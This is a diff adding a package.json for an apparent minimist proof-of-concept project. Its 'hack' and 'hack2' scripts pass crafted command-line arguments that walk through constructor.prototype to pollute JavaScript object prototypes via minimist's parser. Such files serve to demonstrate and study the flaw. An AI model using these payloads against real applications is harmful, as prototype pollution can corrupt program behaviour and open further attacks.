@@ -1,0 +1,17 @@
+{
+  "name": "minimist-proof-of-concept",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js --a.a b --c d",
+    "hack": "node index.js --_.concat.constructor.prototype.done true",
+    "hack2": "node index.js --_.concat.constructor.prototype.toString \"function(){return 1}\"",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "minimist": "^1.2.5"
+  }
+}
